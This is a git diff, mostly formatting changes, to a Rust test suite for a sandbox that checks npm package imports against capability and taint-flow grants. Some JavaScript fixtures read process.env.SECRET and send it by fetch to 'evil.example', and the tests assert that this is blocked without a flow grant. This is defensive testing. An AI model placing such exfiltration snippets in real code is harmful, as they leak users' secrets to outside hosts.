@@ -22,7 +22,11 @@ use sha2::{Digest, Sha256};
 fn sha256_hex(bytes: &[u8]) -> String {
     let mut hasher = Sha256::new();
     hasher.update(bytes);
-    hasher.finalize().iter().map(|b| format!("{b:02x}")).collect()
+    hasher
+        .finalize()
+        .iter()
+        .map(|b| format!("{b:02x}"))
+        .collect()
 }
 
 fn npm_tgz(main: &str, files: &[(&str, &str)]) -> Vec<u8> {
@@ -130,7 +134,10 @@ fn a_cross_package_pure_call_value() {
         "3.0.1",
         &npm_tgz(
             "index.js",
-            &[("index.js", "module.exports = function isOdd(n) { return n % 2 === 1; };")],
+            &[(
+                "index.js",
+                "module.exports = function isOdd(n) { return n % 2 === 1; };",
+            )],
         ),
         Vec::new(),
     );
@@ -178,8 +185,7 @@ fn a_cross_package_pure_call_value() {
 #[test]
 fn b_cross_package_exfil_denied_then_admitted_with_flow() {
     // The dependency reads process.env.SECRET and POSTs it to evil.example.
-    let leaker_src =
-        "module.exports = function leak() { const s = process.env.SECRET; \
+    let leaker_src = "module.exports = function leak() { const s = process.env.SECRET; \
          return fetch('https://evil.example/c', s); };";
     let app_src =
         "module.exports = function main() { const dep = require('leaker'); return dep(); };";
@@ -211,9 +217,12 @@ fn b_cross_package_exfil_denied_then_admitted_with_flow() {
         let project = dir.path();
         build(project, &[], &[]);
         let mut broker = MemoryBroker::new().with_env("SECRET", "topsecret");
-        let err = execute_project(project, ExecTarget::package("app"), vec![], &mut broker)
-            .unwrap_err();
-        assert!(matches!(err, ExecError::Verify { .. }), "no-grant exfil must be denied, got {err}");
+        let err =
+            execute_project(project, ExecTarget::package("app"), vec![], &mut broker).unwrap_err();
+        assert!(
+            matches!(err, ExecError::Verify { .. }),
+            "no-grant exfil must be denied, got {err}"
+        );
     }
 
     // Grant env + network capabilities but NO flow rule: the taint flow
@@ -223,8 +232,8 @@ fn b_cross_package_exfil_denied_then_admitted_with_flow() {
         let project = dir.path();
         build(project, &["env:SECRET", "network:evil.example"], &[]);
         let mut broker = MemoryBroker::new().with_env("SECRET", "topsecret");
-        let err = execute_project(project, ExecTarget::package("app"), vec![], &mut broker)
-            .unwrap_err();
+        let err =
+            execute_project(project, ExecTarget::package("app"), vec![], &mut broker).unwrap_err();
         assert!(
             matches!(err, ExecError::Verify { .. }),
             "capabilities without flow grant must still deny exfil, got {err}"
@@ -257,7 +266,8 @@ fn b_cross_package_exfil_denied_then_admitted_with_flow() {
 #[test]
 fn b2_taint_propagates_through_callimport_argument() {
     // sink(x) posts x to the network. app reads the secret and calls sink(secret).
-    let sink_src = "module.exports = function sink(x) { return fetch('https://evil.example/c', x); };";
+    let sink_src =
+        "module.exports = function sink(x) { return fetch('https://evil.example/c', x); };";
     let app_src = "module.exports = function main() { const sink = require('sink'); \
                    const s = process.env.SECRET; return sink(s); };";
 
@@ -289,8 +299,8 @@ fn b2_taint_propagates_through_callimport_argument() {
         let project = dir.path();
         build(project, &[]);
         let mut broker = MemoryBroker::new().with_env("SECRET", "topsecret");
-        let err = execute_project(project, ExecTarget::package("app"), vec![], &mut broker)
-            .unwrap_err();
+        let err =
+            execute_project(project, ExecTarget::package("app"), vec![], &mut broker).unwrap_err();
         assert!(
             matches!(err, ExecError::Verify { .. }),
             "secret-through-import-arg exfil must be denied, got {err}"
@@ -303,7 +313,11 @@ fn b2_taint_propagates_through_callimport_argument() {
         build(project, &["env:SECRET -> network:evil.example"]);
         let mut broker = MemoryBroker::new().with_env("SECRET", "topsecret");
         let result = execute_project(project, ExecTarget::package("app"), vec![], &mut broker);
-        assert!(result.is_ok(), "flow grant must admit, got {:?}", result.err());
+        assert!(
+            result.is_ok(),
+            "flow grant must admit, got {:?}",
+            result.err()
+        );
     }
 }
 
@@ -321,7 +335,10 @@ fn c_missing_lock_entry_fails_closed() {
         "1.0.0",
         &npm_tgz(
             "index.js",
-            &[("index.js", "module.exports = function main(n) { const h = require('helper'); return h(n); };")],
+            &[(
+                "index.js",
+                "module.exports = function main(n) { const h = require('helper'); return h(n); };",
+            )],
         ),
         vec!["npm:helper@1.0.0".to_owned()],
     );
@@ -334,9 +351,15 @@ fn c_missing_lock_entry_fails_closed() {
         &mut broker,
     )
     .unwrap_err();
-    assert!(matches!(err, ExecError::Lock(_)), "missing dep must fail closed, got {err}");
+    assert!(
+        matches!(err, ExecError::Lock(_)),
+        "missing dep must fail closed, got {err}"
+    );
     let msg = err.to_string();
-    assert!(msg.contains("helper"), "error should name the missing package: {msg}");
+    assert!(
+        msg.contains("helper"),
+        "error should name the missing package: {msg}"
+    );
 }
 
 // (c2) an import that is NOT a declared lock dependency fails closed.
@@ -350,7 +373,13 @@ fn c2_undeclared_import_fails_closed() {
         Ecosystem::Npm,
         "is-odd",
         "3.0.1",
-        &npm_tgz("index.js", &[("index.js", "module.exports = function isOdd(n) { return n % 2 === 1; };")]),
+        &npm_tgz(
+            "index.js",
+            &[(
+                "index.js",
+                "module.exports = function isOdd(n) { return n % 2 === 1; };",
+            )],
+        ),
         Vec::new(),
     );
     // app requires is-odd at runtime but declares NO dependency on it.
@@ -361,7 +390,10 @@ fn c2_undeclared_import_fails_closed() {
         "1.0.0",
         &npm_tgz(
             "index.js",
-            &[("index.js", "module.exports = function main(n) { const d = require('is-odd'); return d(n); };")],
+            &[(
+                "index.js",
+                "module.exports = function main(n) { const d = require('is-odd'); return d(n); };",
+            )],
         ),
         Vec::new(),
     );
@@ -374,7 +406,10 @@ fn c2_undeclared_import_fails_closed() {
         &mut broker,
     )
     .unwrap_err();
-    assert!(matches!(err, ExecError::Lock(_)), "undeclared import must fail closed, got {err}");
+    assert!(
+        matches!(err, ExecError::Lock(_)),
+        "undeclared import must fail closed, got {err}"
+    );
 }
 
 // (d) a dependency whose source is outside the lowerable subset fails closed.
@@ -388,7 +423,10 @@ fn d_unlowerable_dependency_fails_closed() {
         Ecosystem::Npm,
         "broken-dep",
         "1.0.0",
-        &npm_tgz("index.js", &[("index.js", "class Oops { @@@ not valid js @@@ }")]),
+        &npm_tgz(
+            "index.js",
+            &[("index.js", "class Oops { @@@ not valid js @@@ }")],
+        ),
         Vec::new(),
     );
     let app = locked_pkg(
@@ -411,7 +449,10 @@ fn d_unlowerable_dependency_fails_closed() {
         &mut broker,
     )
     .unwrap_err();
-    assert!(matches!(err, ExecError::Lower(_)), "unlowerable dep must fail closed, got {err}");
+    assert!(
+        matches!(err, ExecError::Lower(_)),
+        "unlowerable dep must fail closed, got {err}"
+    );
 }
 
 // (e) import-id mapping correctness / swap resistance: app imports TWO distinct
@@ -433,7 +474,13 @@ fn e_two_dependency_import_dispatch_is_swap_resistant() {
         Ecosystem::Npm,
         "add100",
         "1.0.0",
-        &npm_tgz("index.js", &[("index.js", "module.exports = function add100(n) { return n + 100; };")]),
+        &npm_tgz(
+            "index.js",
+            &[(
+                "index.js",
+                "module.exports = function add100(n) { return n + 100; };",
+            )],
+        ),
         Vec::new(),
     );
     let mul3 = locked_pkg(
@@ -441,7 +488,13 @@ fn e_two_dependency_import_dispatch_is_swap_resistant() {
         Ecosystem::Npm,
         "mul3",
         "1.0.0",
-        &npm_tgz("index.js", &[("index.js", "module.exports = function mul3(n) { return n * 3; };")]),
+        &npm_tgz(
+            "index.js",
+            &[(
+                "index.js",
+                "module.exports = function mul3(n) { return n * 3; };",
+            )],
+        ),
         Vec::new(),
     );
     // Note source order: mul3 is required FIRST, add100 SECOND, but the
@@ -474,7 +527,11 @@ fn e_two_dependency_import_dispatch_is_swap_resistant() {
     )
     .unwrap();
     // add100(10) - mul3(10) = 110 - 30 = 80. Swapped would be -80.
-    assert_eq!(result.value, Value::Int(80), "two-dep dispatch must be order-correct (swap would give -80)");
+    assert_eq!(
+        result.value,
+        Value::Int(80),
+        "two-dep dispatch must be order-correct (swap would give -80)"
+    );
 }
 
 // (e2) Cross-check: an importer that calls is-odd AND a second pure dep, to
@@ -490,7 +547,13 @@ fn e2_iseven_plus_second_dep() {
         Ecosystem::Npm,
         "is-odd",
         "3.0.1",
-        &npm_tgz("index.js", &[("index.js", "module.exports = function isOdd(n) { return n % 2 === 1; };")]),
+        &npm_tgz(
+            "index.js",
+            &[(
+                "index.js",
+                "module.exports = function isOdd(n) { return n % 2 === 1; };",
+            )],
+        ),
         Vec::new(),
     );
     let double = locked_pkg(
@@ -498,7 +561,13 @@ fn e2_iseven_plus_second_dep() {
         Ecosystem::Npm,
         "double",
         "1.0.0",
-        &npm_tgz("index.js", &[("index.js", "module.exports = function double(n) { return n + n; };")]),
+        &npm_tgz(
+            "index.js",
+            &[(
+                "index.js",
+                "module.exports = function double(n) { return n + n; };",
+            )],
+        ),
         Vec::new(),
     );
     // isEvenDoubled(n): if isOdd(n) return -1 else return double(n).
